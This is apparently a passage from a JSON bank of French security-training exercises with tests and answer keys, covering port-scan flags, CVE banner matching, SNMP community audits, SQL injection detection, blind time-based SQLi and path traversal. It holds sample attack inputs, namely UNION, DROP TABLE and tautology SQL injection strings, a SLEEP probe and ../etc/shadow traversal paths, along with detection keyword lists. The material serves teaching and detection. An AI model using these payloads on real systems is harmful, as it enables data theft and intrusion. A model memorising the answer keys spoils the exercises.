    "starter": "# Grille d'analyse (hk3-c3-e1) — Interpréteur de Drapeaux TCP et Diagnostic de Sondes de Scan\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Sonde SYN recevant un paquet de réinitialisation RST]\n# Données : TCP_PROBE scan_type=SYN port=21 reply=RST\nA_COMPLETER\n\n[Cas 2 — Sonde furtive XMAS sans réponse face à une pile TCP conforme RFC 793]\n# Données : TCP_PROBE scan_type=XMAS port=80 reply=TIMEOUT\nA_COMPLETER\n\n[Cas 3 — Sonde ACK cartographiant un pare-feu avec paquet RST de retour]\n# Données : TCP_PROBE scan_type=ACK port=8080 reply=RST\nA_COMPLETER\n\n[Cas 4 — Sonde SYN filtrée par pare-feu silencieux (Drop/Timeout)]\n# Données : TCP_PROBE scan_type=SYN port=3389 reply=TIMEOUT\nA_COMPLETER\n",
    "hints": [
      "Gérez les cas selon scan_type (SYN, FIN/NULL/XMAS, ACK).",
      "Pour SYN, SYN+ACK signifie OPEN et RST signifie CLOSED.",
      "Pour FIN/NULL/XMAS, TIMEOUT signifie OPEN|FILTERED et RST signifie CLOSED."
    ],
    "examples": [
      {
        "stdin": "TCP_PROBE scan_type=SYN port=443 reply=SYN+ACK",
        "expected": "PORT_STATE: port=443 scan_type=SYN reply=SYN+ACK state=OPEN",
        "note": "Port HTTPS ouvert renvoyant un paquet SYN+ACK de synchronisation."
      }
    ],
    "tests": [
      {
        "label": "Sonde SYN recevant un paquet de réinitialisation RST",
        "stdin": "cas:1",
        "expected": "PORT_STATE: port=21 scan_type=SYN reply=RST state=CLOSED"
      },
      {
        "label": "Sonde furtive XMAS sans réponse face à une pile TCP conforme RFC 793",
        "stdin": "cas:2",
        "expected": "PORT_STATE: port=80 scan_type=XMAS reply=TIMEOUT state=OPEN|FILTERED"
      },
      {
        "label": "Sonde ACK cartographiant un pare-feu avec paquet RST de retour",
        "stdin": "cas:3",
        "expected": "PORT_STATE: port=8080 scan_type=ACK reply=RST state=UNFILTERED"
      },
      {
        "label": "Sonde SYN filtrée par pare-feu silencieux (Drop/Timeout)",
        "stdin": "cas:4",
        "expected": "PORT_STATE: port=3389 scan_type=SYN reply=TIMEOUT state=FILTERED"
      }
    ],
    "solution": "[Exemple]\nPORT_STATE: port=443 scan_type=SYN reply=SYN+ACK state=OPEN\n\n[Cas 1 — Sonde SYN recevant un paquet de réinitialisation RST]\nPORT_STATE: port=21 scan_type=SYN reply=RST state=CLOSED\n\n[Cas 2 — Sonde furtive XMAS sans réponse face à une pile TCP conforme RFC 793]\nPORT_STATE: port=80 scan_type=XMAS reply=TIMEOUT state=OPEN|FILTERED\n\n[Cas 3 — Sonde ACK cartographiant un pare-feu avec paquet RST de retour]\nPORT_STATE: port=8080 scan_type=ACK reply=RST state=UNFILTERED\n\n[Cas 4 — Sonde SYN filtrée par pare-feu silencieux (Drop/Timeout)]\nPORT_STATE: port=3389 scan_type=SYN reply=TIMEOUT state=FILTERED"
  },
  {
    "id": "hk3-c3-e2",
    "chapter": 3,
    "title": "Analyseur de Bannières de Services Réseau et Détection de Failles Connues",
    "level": "n2",
    "language": "analyse",
    "goal": "Extraire les versions logicielles des bannières de services réseau et identifier les vulnérabilités critiques associées.",
    "brief": "<p>Le banner grabbing permet de repérer des versions logicielles vulnérables avant toute phase d'exploitation.<br><br>\nBase de signatures connues :<br>\n- <code>vsFTPd 2.3.4</code> -> <code>cve=CVE-2011-2523</code>, <code>severity=CRITICAL</code>, <code>desc=Backdoor_Command_Execution</code><br>\n- <code>Apache/2.4.49</code> -> <code>cve=CVE-2021-41773</code>, <code>severity=CRITICAL</code>, <code>desc=Path_Traversal_RCE</code><br>\n- <code>OpenSSH_7.2p2</code> -> <code>cve=CVE-2016-6210</code>, <code>severity=MEDIUM</code>, <code>desc=User_Enumeration</code><br>\n- <code>ProFTPD 1.3.5</code> -> <code>cve=CVE-2015-3306</code>, <code>severity=HIGH</code>, <code>desc=mod_copy_Arbitrary_Copy</code><br>\n- Autre version -> <code>cve=NONE</code>, <code>severity=INFO</code>, <code>desc=UP_TO_DATE_OR_CUSTOM</code><br><br>\nDonnées du cas : <code>BANNER_SCAN port=&lt;p&gt; service=&lt;svc&gt; banner=&lt;texte_banniere&gt;</code>.<br>\nRésultat d’analyse attendu : <code>VULN_MATCH: port=&lt;p&gt; service=&lt;svc&gt; cve=&lt;cve&gt; severity=&lt;sev&gt; desc=&lt;desc&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c3-e2) — Analyseur de Bannières de Services Réseau et Détection de Failles Connues\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Serveur HTTP Apache vulnérable à la traversée de répertoire critique]\n# Données : BANNER_SCAN port=80 service=http banner=Server: Apache/2.4.49 (Unix)\nA_COMPLETER\n\n[Cas 2 — Démon SSH vulnérable à l'énumération de comptes utilisateurs]\n# Données : BANNER_SCAN port=22 service=ssh banner=SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\nA_COMPLETER\n\n[Cas 3 — Service FTP ProFTPD avec module mod_copy vulnérable]\n# Données : BANNER_SCAN port=2121 service=ftp banner=220 ProFTPD 1.3.5 Server\nA_COMPLETER\n\n[Cas 4 — Version récente sans vulnérabilité connue répertoriée]\n# Données : BANNER_SCAN port=443 service=https banner=Server: nginx/1.24.0\nA_COMPLETER\n",
    "hints": [
      "Utilisez l’extraction des champs pour préserver les espaces dans le texte de la bannière.",
      "Vérifiez la présence des sous-chaînes de versions critiques dans la bannière.",
      "Générez la sortie standardisée VULN_MATCH."
    ],
    "examples": [
      {
        "stdin": "BANNER_SCAN port=21 service=ftp banner=220 (vsFTPd 2.3.4)",
        "expected": "VULN_MATCH: port=21 service=ftp cve=CVE-2011-2523 severity=CRITICAL desc=Backdoor_Command_Execution",
        "note": "Backdoor historique du serveur FTP vsFTPd 2.3.4 permettant l'exécution root."
      }
    ],
    "tests": [
      {
        "label": "Serveur HTTP Apache vulnérable à la traversée de répertoire critique",
        "stdin": "cas:1",
        "expected": "VULN_MATCH: port=80 service=http cve=CVE-2021-41773 severity=CRITICAL desc=Path_Traversal_RCE"
      },
      {
        "label": "Démon SSH vulnérable à l'énumération de comptes utilisateurs",
        "stdin": "cas:2",
        "expected": "VULN_MATCH: port=22 service=ssh cve=CVE-2016-6210 severity=MEDIUM desc=User_Enumeration"
      },
      {
        "label": "Service FTP ProFTPD avec module mod_copy vulnérable",
        "stdin": "cas:3",
        "expected": "VULN_MATCH: port=2121 service=ftp cve=CVE-2015-3306 severity=HIGH desc=mod_copy_Arbitrary_Copy"
      },
      {
        "label": "Version récente sans vulnérabilité connue répertoriée",
        "stdin": "cas:4",
        "expected": "VULN_MATCH: port=443 service=https cve=NONE severity=INFO desc=UP_TO_DATE_OR_CUSTOM"
      }
    ],
    "solution": "[Exemple]\nVULN_MATCH: port=21 service=ftp cve=CVE-2011-2523 severity=CRITICAL desc=Backdoor_Command_Execution\n\n[Cas 1 — Serveur HTTP Apache vulnérable à la traversée de répertoire critique]\nVULN_MATCH: port=80 service=http cve=CVE-2021-41773 severity=CRITICAL desc=Path_Traversal_RCE\n\n[Cas 2 — Démon SSH vulnérable à l'énumération de comptes utilisateurs]\nVULN_MATCH: port=22 service=ssh cve=CVE-2016-6210 severity=MEDIUM desc=User_Enumeration\n\n[Cas 3 — Service FTP ProFTPD avec module mod_copy vulnérable]\nVULN_MATCH: port=2121 service=ftp cve=CVE-2015-3306 severity=HIGH desc=mod_copy_Arbitrary_Copy\n\n[Cas 4 — Version récente sans vulnérabilité connue répertoriée]\nVULN_MATCH: port=443 service=https cve=NONE severity=INFO desc=UP_TO_DATE_OR_CUSTOM"
  },
  {
    "id": "hk3-c3-e3",
    "chapter": 3,
    "title": "Simulateur d'Audit SNMP et Détection de Communautés Vulnérables",
    "level": "n3",
    "language": "analyse",
    "goal": "Auditer les chaînes de communauté SNMP d'un commutateur ou routeur et classifier le niveau de compromission.",
    "brief": "<p>SNMP v1 et v2c transmettent les chaînes de communauté en clair sans chiffrement.<br><br>\nRègles d'évaluation :<br>\n- On teste successivement chaque chaîne de la liste de dictionnaires <code>wordlist</code> contre la cible.<br>\n- Si une chaîne correspond à <code>target_community</code> :<br>\n  - Si <code>target_perm == 'RW'</code> : <code>status=COMPROMISED</code>, <code>risk=CRITICAL</code> (modification d'équipement possible).<br>\n  - Si <code>target_perm == 'RO'</code> : <code>status=COMPROMISED</code>, <code>risk=HIGH</code> (fuite complète d'arborescence MIB).<br>\n- Si aucune chaîne ne correspond :<br>\n  - <code>status=SECURE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SNMP_TEST target=&lt;ip&gt; wordlist=&lt;w1,w2,...&gt; target_community=&lt;comm&gt; target_perm=&lt;RO|RW&gt; sys_descr=&lt;descr&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n- Si compromis : <code>SNMP_AUDIT: target=&lt;ip&gt; status=COMPROMISED matched_community=&lt;comm&gt; perm=&lt;perm&gt; attempts=&lt;N&gt; risk=&lt;risk&gt; sys_descr=&lt;descr&gt;</code><br>\n- Si non compromis : <code>SNMP_AUDIT: target=&lt;ip&gt; status=SECURE attempts=&lt;N&gt; risk=LOW reason=COMMUNITY_NOT_FOUND</code></p>",
    "starter": "# Grille d'analyse (hk3-c3-e3) — Simulateur d'Audit SNMP et Détection de Communautés Vulnérables\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Chaîne de communauté d'écriture Read-Write découverte au troisième essai]\n# Données : SNMP_TEST target=10.0.0.254 wordlist=public,cisco,private,switch target_community=private target_perm=RW sys_descr=Juniper_EX4300\nA_COMPLETER\n\n[Cas 2 — Cible robuste dont la chaîne n'est pas dans le dictionnaire testé]\n# Données : SNMP_TEST target=172.16.1.1 wordlist=public,private,secret target_community=complex_snmp_9821 target_perm=RO sys_descr=Linux_Router\nA_COMPLETER\n\n[Cas 3 — Dictionnaire volumineux arrêtant la recherche dès la première correspondance]\n# Données : SNMP_TEST target=192.168.100.10 wordlist=manager,monitor,operator target_community=monitor target_perm=RO sys_descr=HP_ProCurve\nA_COMPLETER\n",
    "hints": [
      "Découpez wordlist sur la virgule et itérez dans l'ordre.",
      "Dès qu'un mot correspond à target_community, arrêtez-vous et notez le nombre d'essais effectués.",
      "Si target_perm == RW -> risk=CRITICAL, sinon risk=HIGH."
    ],
    "examples": [
      {
        "stdin": "SNMP_TEST target=192.168.1.1 wordlist=public,private,cisco,admin target_community=public target_perm=RO sys_descr=Cisco_IOS_Software_C2960",
        "expected": "SNMP_AUDIT: target=192.168.1.1 status=COMPROMISED matched_community=public perm=RO attempts=1 risk=HIGH sys_descr=Cisco_IOS_Software_C2960",
        "note": "Chaîne publique par défaut permettant la lecture intégrale des interfaces et tables ARP."
      }
    ],
    "tests": [
      {
        "label": "Chaîne de communauté d'écriture Read-Write découverte au troisième essai",
        "stdin": "cas:1",
        "expected": "SNMP_AUDIT: target=10.0.0.254 status=COMPROMISED matched_community=private perm=RW attempts=3 risk=CRITICAL sys_descr=Juniper_EX4300"
      },
      {
        "label": "Cible robuste dont la chaîne n'est pas dans le dictionnaire testé",
        "stdin": "cas:2",
        "expected": "SNMP_AUDIT: target=172.16.1.1 status=SECURE attempts=3 risk=LOW reason=COMMUNITY_NOT_FOUND"
      },
      {
        "label": "Dictionnaire volumineux arrêtant la recherche dès la première correspondance",
        "stdin": "cas:3",
        "expected": "SNMP_AUDIT: target=192.168.100.10 status=COMPROMISED matched_community=monitor perm=RO attempts=2 risk=HIGH sys_descr=HP_ProCurve"
      }
    ],
    "solution": "[Exemple]\nSNMP_AUDIT: target=192.168.1.1 status=COMPROMISED matched_community=public perm=RO attempts=1 risk=HIGH sys_descr=Cisco_IOS_Software_C2960\n\n[Cas 1 — Chaîne de communauté d'écriture Read-Write découverte au troisième essai]\nSNMP_AUDIT: target=10.0.0.254 status=COMPROMISED matched_community=private perm=RW attempts=3 risk=CRITICAL sys_descr=Juniper_EX4300\n\n[Cas 2 — Cible robuste dont la chaîne n'est pas dans le dictionnaire testé]\nSNMP_AUDIT: target=172.16.1.1 status=SECURE attempts=3 risk=LOW reason=COMMUNITY_NOT_FOUND\n\n[Cas 3 — Dictionnaire volumineux arrêtant la recherche dès la première correspondance]\nSNMP_AUDIT: target=192.168.100.10 status=COMPROMISED matched_community=monitor perm=RO attempts=2 risk=HIGH sys_descr=HP_ProCurve"
  },
  {
    "id": "hk3-c4-e1",
    "chapter": 4,
    "title": "Détecteur de Vecteurs d'Injection SQL (SQLi Pattern Analyzer)",
    "level": "n1",
    "language": "analyse",
    "goal": "Analyser une chaîne de paramètres HTTP pour détecter et classifier les signatures d'injection SQL.",
    "brief": "<p>L'injection SQL (A03:2021-Injection dans l'OWASP Top 10) survient lorsqu'une entrée utilisateur non nettoyée est concaténée dans une commande SQL.<br><br>\nTypes de motifs surveillés (insensibles à la casse) :<br>\n1. <code>SQLI_UNION</code> : contient <code>UNION SELECT</code> ou <code>UNION ALL SELECT</code>.<br>\n2. <code>SQLI_TAUTOLOGY</code> : contient <code>OR 1=1</code>, <code>OR '1'='1'</code>, <code>OR \"1\"=\"1\"</code> ou <code>OR \"\"=\"\"</code>.<br>\n3. <code>SQLI_STACKED</code> : contient <code>; DROP</code>, <code>; INSERT</code>, <code>; UPDATE</code>, <code>; DELETE</code> ou <code>; WAITFOR</code>.<br>\n4. <code>SQLI_COMMENT</code> : contient <code>--</code>, <code>/*</code> ou <code>#</code> en fin ou milieu de chaîne suspecte.<br><br>\nPriorité d'attribution : <code>SQLI_UNION</code> &gt; <code>SQLI_TAUTOLOGY</code> &gt; <code>SQLI_STACKED</code> &gt; <code>SQLI_COMMENT</code>.<br><br>\nDonnées du cas : <code>SQLI_CHECK param=&lt;valeur&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n- Si injection : <code>SQLI_ALERT: pattern=&lt;TYPE&gt; severity=CRITICAL status=INJECTION_DETECTED</code><br>\n- Si sain : <code>SQLI_ALERT: pattern=NONE severity=NONE status=CLEAN_PARAM</code></p>",
    "starter": "# Grille d'analyse (hk3-c4-e1) — Détecteur de Vecteurs d'Injection SQL (SQLi Pattern Analyzer)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Injection UNION pour extraction de données d'autres tables]\n# Données : SQLI_CHECK param=1 UNION SELECT null, username, password FROM users--\nA_COMPLETER\n\n[Cas 2 — Requêtes empilées (Stacked Queries) avec tentative de suppression de table]\n# Données : SQLI_CHECK param=10; DROP TABLE clients;\nA_COMPLETER\n\n[Cas 3 — Troncature de requête par commentaire seul]\n# Données : SQLI_CHECK param=admin/*comment*/\nA_COMPLETER\n\n[Cas 4 — Paramètre alphanumérique légitime]\n# Données : SQLI_CHECK param=alice_dupont_2026\nA_COMPLETER\n",
    "hints": [
      "Extrayez la valeur du paramètre avec l’extraction des champs[1] pour préserver les espaces.",
      "Convertissez la valeur en majuscules pour tester les mots-clés UNION SELECT, OR 1=1, etc.",
      "Vérifiez les motifs dans l'ordre de priorité spécifié."
    ],
    "examples": [
      {
        "stdin": "SQLI_CHECK param=admin' OR '1'='1' --",
        "expected": "SQLI_ALERT: pattern=SQLI_TAUTOLOGY severity=CRITICAL status=INJECTION_DETECTED",
        "note": "Tautologie booléenne classique permettant le contournement d'authentification."
      }
    ],
    "tests": [
      {
        "label": "Injection UNION pour extraction de données d'autres tables",
        "stdin": "cas:1",
        "expected": "SQLI_ALERT: pattern=SQLI_UNION severity=CRITICAL status=INJECTION_DETECTED"
      },
      {
        "label": "Requêtes empilées (Stacked Queries) avec tentative de suppression de table",
        "stdin": "cas:2",
        "expected": "SQLI_ALERT: pattern=SQLI_STACKED severity=CRITICAL status=INJECTION_DETECTED"
      },
      {
        "label": "Troncature de requête par commentaire seul",
        "stdin": "cas:3",
        "expected": "SQLI_ALERT: pattern=SQLI_COMMENT severity=CRITICAL status=INJECTION_DETECTED"
      },
      {
        "label": "Paramètre alphanumérique légitime",
        "stdin": "cas:4",
        "expected": "SQLI_ALERT: pattern=NONE severity=NONE status=CLEAN_PARAM"
      }
    ],
    "solution": "[Exemple]\nSQLI_ALERT: pattern=SQLI_TAUTOLOGY severity=CRITICAL status=INJECTION_DETECTED\n\n[Cas 1 — Injection UNION pour extraction de données d'autres tables]\nSQLI_ALERT: pattern=SQLI_UNION severity=CRITICAL status=INJECTION_DETECTED\n\n[Cas 2 — Requêtes empilées (Stacked Queries) avec tentative de suppression de table]\nSQLI_ALERT: pattern=SQLI_STACKED severity=CRITICAL status=INJECTION_DETECTED\n\n[Cas 3 — Troncature de requête par commentaire seul]\nSQLI_ALERT: pattern=SQLI_COMMENT severity=CRITICAL status=INJECTION_DETECTED\n\n[Cas 4 — Paramètre alphanumérique légitime]\nSQLI_ALERT: pattern=NONE severity=NONE status=CLEAN_PARAM"
  },
  {
    "id": "hk3-c4-e2",
    "chapter": 4,
    "title": "Simulateur d'Attaque par Injection SQL Aveugle Basée sur le Temps",
    "level": "n2",
    "language": "analyse",
    "goal": "Simuler l'inférence de données caractère par caractère via des sondes temporelles (Time-Based Blind SQLi).",
    "brief": "<p>Quand une application web ne renvoie aucune erreur ni donnée dans ses pages, l'attaquant exploite une commande de temporisation (ex: <code>IF(SUBSTRING(secret,1,1)='A', SLEEP(5), 0)</code>).<br><br>\nRègles de simulation :<br>\n- Un secret est stocké sur la cible : <code>actual_secret</code>.<br>\n- Chaque sonde teste un couple <code>pos:char</code> (position 1-indexée).<br>\n- Si <code>1 &lt;= pos &lt;= len(actual_secret)</code> et <code>actual_secret[pos - 1] == char</code> :<br>\n  - La condition est <code>TRUE</code>, le délai simulé vaut <code>5.0s</code>, caractère confirmé.<br>\n- Sinon :<br>\n  - La condition est <code>FALSE</code>, le délai vaut <code>0.0s</code>, caractère réfuté.<br><br>\nDonnées du cas : <code>TIME_INFER actual_secret=&lt;secret&gt; probes=&lt;pos1:c1,pos2:c2,...&gt;</code>.<br>\nRésultats d’analyse attendus :<br>\n- Pour chaque sonde : <code>PROBE: pos=&lt;p&gt; char=&lt;c&gt; match=&lt;TRUE|FALSE&gt; delay=&lt;5.0|0.0&gt;s</code><br>\n- Ligne récapitulative finale : <code>EXTRACTED: confirmed_chars=&lt;caractères_trouvés_dans_l_ordre|NONE&gt;</code> (chaîne des caractères validés concaténés dans l'ordre croissant de leur position unique).</p>",
    "starter": "# Grille d'analyse (hk3-c4-e2) — Simulateur d'Attaque par Injection SQL Aveugle Basée sur le Temps\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Recherche de mot de passe administrateur avec échecs et succès]\n# Données : TIME_INFER actual_secret=ROOT probes=1:A,1:R,2:O,3:O,4:T\nA_COMPLETER\n\n[Cas 2 — Aucune sonde ne devine le bon caractère]\n# Données : TIME_INFER actual_secret=SECRET probes=1:X,2:Y,3:Z\nA_COMPLETER\n\n[Cas 3 — Extraction partielle de jeton d'API]\n# Données : TIME_INFER actual_secret=TOK123 probes=1:T,2:O,5:2\nA_COMPLETER\n",
    "hints": [
      "Parcourez probes en découpant pos:char.",
      "Comparez char avec secret[pos - 1] si pos est dans les bornes.",
      "Conservez un dictionnaire {pos: char} des caractères validés pour reconstituer la chaîne finale."
    ],
    "examples": [
      {
        "stdin": "TIME_INFER actual_secret=FLAG probes=1:F,1:B,2:L,3:A,4:G",
        "expected": "PROBE: pos=1 char=F match=TRUE delay=5.0s\nPROBE: pos=1 char=B match=FALSE delay=0.0s\nPROBE: pos=2 char=L match=TRUE delay=5.0s\nPROBE: pos=3 char=A match=TRUE delay=5.0s\nPROBE: pos=4 char=G match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=FLAG",
        "note": "Extraction complète des 4 caractères du secret grâce au délai de 5 secondes."
      }
    ],
    "tests": [
      {
        "label": "Recherche de mot de passe administrateur avec échecs et succès",
        "stdin": "cas:1",
        "expected": "PROBE: pos=1 char=A match=FALSE delay=0.0s\nPROBE: pos=1 char=R match=TRUE delay=5.0s\nPROBE: pos=2 char=O match=TRUE delay=5.0s\nPROBE: pos=3 char=O match=TRUE delay=5.0s\nPROBE: pos=4 char=T match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=ROOT"
      },
      {
        "label": "Aucune sonde ne devine le bon caractère",
        "stdin": "cas:2",
        "expected": "PROBE: pos=1 char=X match=FALSE delay=0.0s\nPROBE: pos=2 char=Y match=FALSE delay=0.0s\nPROBE: pos=3 char=Z match=FALSE delay=0.0s\nEXTRACTED: confirmed_chars=NONE"
      },
      {
        "label": "Extraction partielle de jeton d'API",
        "stdin": "cas:3",
        "expected": "PROBE: pos=1 char=T match=TRUE delay=5.0s\nPROBE: pos=2 char=O match=TRUE delay=5.0s\nPROBE: pos=5 char=2 match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=TO2"
      }
    ],
    "solution": "[Exemple]\nPROBE: pos=1 char=F match=TRUE delay=5.0s\nPROBE: pos=1 char=B match=FALSE delay=0.0s\nPROBE: pos=2 char=L match=TRUE delay=5.0s\nPROBE: pos=3 char=A match=TRUE delay=5.0s\nPROBE: pos=4 char=G match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=FLAG\n\n[Cas 1 — Recherche de mot de passe administrateur avec échecs et succès]\nPROBE: pos=1 char=A match=FALSE delay=0.0s\nPROBE: pos=1 char=R match=TRUE delay=5.0s\nPROBE: pos=2 char=O match=TRUE delay=5.0s\nPROBE: pos=3 char=O match=TRUE delay=5.0s\nPROBE: pos=4 char=T match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=ROOT\n\n[Cas 2 — Aucune sonde ne devine le bon caractère]\nPROBE: pos=1 char=X match=FALSE delay=0.0s\nPROBE: pos=2 char=Y match=FALSE delay=0.0s\nPROBE: pos=3 char=Z match=FALSE delay=0.0s\nEXTRACTED: confirmed_chars=NONE\n\n[Cas 3 — Extraction partielle de jeton d'API]\nPROBE: pos=1 char=T match=TRUE delay=5.0s\nPROBE: pos=2 char=O match=TRUE delay=5.0s\nPROBE: pos=5 char=2 match=TRUE delay=5.0s\nEXTRACTED: confirmed_chars=TO2"
  },
  {
    "id": "hk3-c4-e3",
    "chapter": 4,
    "title": "Analyseur de Traversée de Répertoire et Inclusion de Fichiers (Path Traversal / LFI)",
    "level": "n3",
    "language": "analyse",
    "goal": "Détecter les tentatives de traversée de répertoire (Directory Traversal) et normaliser les chemins d'accès URI.",
    "brief": "<p>L'attaque par traversée de répertoire vise à accéder à des fichiers situés hors du dossier racine autorisé (ex: <code>/etc/passwd</code>, <code>win.ini</code>).<br><br>\nAlgorithme de normalisation et détection :<br>\n1. Décodage d'URL : remplacer <code>%2e%2e%2f</code> et <code>%2e%2e/</code> par <code>../</code>, <code>%2e%2e%5c</code> par <code>..\\</code>.<br>\n2. Remplacer les séparateurs Windows <code>\\</code> par <code>/</code>.<br>\n3. Tronquer la chaîne si un octet nul (<code>%00</code> ou <code>\\0</code>) est injecté.<br>\n4. Résolution de chemin virtuel :<br>\n   - Partir d'une liste vide de segments.<br>\n   - Pour chaque segment entre les slashes <code>/</code> :<br>\n     - Si <code>.</code> ou vide : ignorer.<br>\n     - Si <code>..</code> : dépiler le dernier segment s'il existe. Si la pile est déjà vide, marquer <code>ESCAPED_ROOT = True</code>.<br>\n     - Sinon : empiler le segment.<br>\n5. Décision de sécurité :<br>\n   - Si <code>ESCAPED_ROOT</code> est Vrai ou si le chemin résolu cible un fichier système sensible (<code>passwd</code>, <code>shadow</code>, <code>hosts</code>, <code>win.ini</code>) :<br>\n     <code>status=BLOCKED_TRAVERSAL</code>, <code>risk=CRITICAL</code>.<br>\n   - Sinon : <code>status=SAFE_ACCESS</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>LFI_CHECK path=&lt;chemin_brut&gt;</code>.<br>\nRésultat d’analyse attendu : <code>LFI_AUDIT: input=&lt;path&gt; resolved=&lt;/seg1/seg2|ROOT&gt; status=&lt;BLOCKED_TRAVERSAL|SAFE_ACCESS&gt; risk=&lt;CRITICAL|LOW&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c4-e3) — Analyseur de Traversée de Répertoire et Inclusion de Fichiers (Path Traversal / LFI)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Tentative d'évasion avec encodage URL pour contourner les filtres basiques]\n# Données : LFI_CHECK path=%2e%2e%2f%2e%2e%2fetc/shadow\nA_COMPLETER\n\n[Cas 2 — Chemin légitime restant confiné dans le sous-dossier autorisé]\n# Données : LFI_CHECK path=documents/2026/rapport.pdf\nA_COMPLETER\n\n[Cas 3 — Chemin avec retour relatif interne autorisé ne sortant pas de la racine]\n# Données : LFI_CHECK path=images/sub/../logo.png\nA_COMPLETER\n",
    "hints": [
      "Normalisez les encodages URL (%2e%2e%2f -> ../).",
      "Tronquez à %00 si présent.",
      "Gérez la pile de segments et détectez si une tentative de sortie de racine survient."
    ],
    "examples": [
      {
        "stdin": "LFI_CHECK path=../../../../etc/passwd",
        "expected": "LFI_AUDIT: input=../../../../etc/passwd resolved=/etc/passwd status=BLOCKED_TRAVERSAL risk=CRITICAL",
        "note": "Tentative d'évasion de racine pour lire le fichier système des comptes Linux."
      }
    ],
    "tests": [
      {
        "label": "Tentative d'évasion avec encodage URL pour contourner les filtres basiques",
        "stdin": "cas:1",
        "expected": "LFI_AUDIT: input=%2e%2e%2f%2e%2e%2fetc/shadow resolved=/etc/shadow status=BLOCKED_TRAVERSAL risk=CRITICAL"
      },
      {
        "label": "Chemin légitime restant confiné dans le sous-dossier autorisé",
        "stdin": "cas:2",
        "expected": "LFI_AUDIT: input=documents/2026/rapport.pdf resolved=/documents/2026/rapport.pdf status=SAFE_ACCESS risk=LOW"
      },
      {
        "label": "Chemin avec retour relatif interne autorisé ne sortant pas de la racine",
        "stdin": "cas:3",
        "expected": "LFI_AUDIT: input=images/sub/../logo.png resolved=/images/logo.png status=SAFE_ACCESS risk=LOW"
      }
    ],
    "solution": "[Exemple]\nLFI_AUDIT: input=../../../../etc/passwd resolved=/etc/passwd status=BLOCKED_TRAVERSAL risk=CRITICAL\n\n[Cas 1 — Tentative d'évasion avec encodage URL pour contourner les filtres basiques]\nLFI_AUDIT: input=%2e%2e%2f%2e%2e%2fetc/shadow resolved=/etc/shadow status=BLOCKED_TRAVERSAL risk=CRITICAL\n\n[Cas 2 — Chemin légitime restant confiné dans le sous-dossier autorisé]\nLFI_AUDIT: input=documents/2026/rapport.pdf resolved=/documents/2026/rapport.pdf status=SAFE_ACCESS risk=LOW\n\n[Cas 3 — Chemin avec retour relatif interne autorisé ne sortant pas de la racine]\nLFI_AUDIT: input=images/sub/../logo.png resolved=/images/logo.png status=SAFE_ACCESS risk=LOW"
  },
  {
    "id": "hk3-c5-e1",
    "chapter": 5,
    "title": "Auditeur de Permissions Linux et Détection de Binaires SUID Anormaux",
    "level": "n1",
    "language": "analyse",
    "goal": "Analyser les permissions octales de fichiers système pour détecter les binaires SUID exploitables (GTFOBins).",
    "brief": "<p>Le bit SUID (Set User ID) permet d'exécuter un binaire avec les privilèges de son propriétaire (généralement root).<br><br>\nBinaires connus du catalogue GTFOBins permettant une évasion directe vers un shell root :<br>\n<code>bash</code>, <code>find</code>, <code>vim</code>, <code>nano</code>, <code>cp</code>, <code>awk</code>, <code>python</code>, <code>nmap</code>, <code>pkexec</code>.<br><br>\nRègles d'évaluation :<br>\n1. Vérifier si le mode octal comporte le bit SUID (chiffre des milliers &gt;= 4, ex: <code>4755</code>, <code>4750</code>) :<br>\n   - Si le bit SUID est absent : <code>exploit=NO_SUID_BIT</code>, <code>risk=NONE</code>.<br>\n2. Si le bit SUID est présent et <code>owner == 'root'</code> :<br>\n   - Si le nom du binaire est dans GTFOBins : <code>exploit=GTFOBINS_PRIVILEGE_ESCALATION</code>, <code>risk=CRITICAL</code>.<br>\n   - Sinon (binaire standard comme <code>passwd</code>, <code>ping</code>) : <code>exploit=STANDARD_SYSTEM_BINARY</code>, <code>risk=LOW</code>.<br>\n3. Si le bit SUID est présent mais <code>owner != 'root'</code> :<br>\n   - <code>exploit=NON_ROOT_SUID</code>, <code>risk=MEDIUM</code>.<br><br>\nDonnées du cas : <code>SUID_CHECK path=&lt;chemin&gt; owner=&lt;user&gt; mode=&lt;octal&gt;</code>.<br>\nRésultat d’analyse attendu : <code>SUID_AUDIT: binary=&lt;nom&gt; owner=&lt;user&gt; mode=&lt;octal&gt; exploit=&lt;exploit&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c5-e1) — Auditeur de Permissions Linux et Détection de Binaires SUID Anormaux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Binaire système passwd avec SUID légitime et restreint]\n# Données : SUID_CHECK path=/usr/bin/passwd owner=root mode=4755\nA_COMPLETER\n\n[Cas 2 — Éditeur vim mis en SUID par erreur d'administration]\n# Données : SUID_CHECK path=/bin/vim owner=root mode=4750\nA_COMPLETER\n\n[Cas 3 — Binaire normal sans aucun bit SUID]\n# Données : SUID_CHECK path=/usr/bin/ls owner=root mode=0755\nA_COMPLETER\n\n[Cas 4 — Binaire SUID appartenant à un utilisateur non root]\n# Données : SUID_CHECK path=/opt/app/worker owner=deploy mode=4755\nA_COMPLETER\n",
    "hints": [
      "Extrayez le nom de base du fichier (ex: /usr/bin/find -> find).",
      "Vérifiez si le premier chiffre du mode octal (mode >= 4000) active le bit SUID.",
      "Comparez avec la liste GTFOBins si owner == root."
    ],
    "examples": [
      {
        "stdin": "SUID_CHECK path=/usr/bin/find owner=root mode=4755",
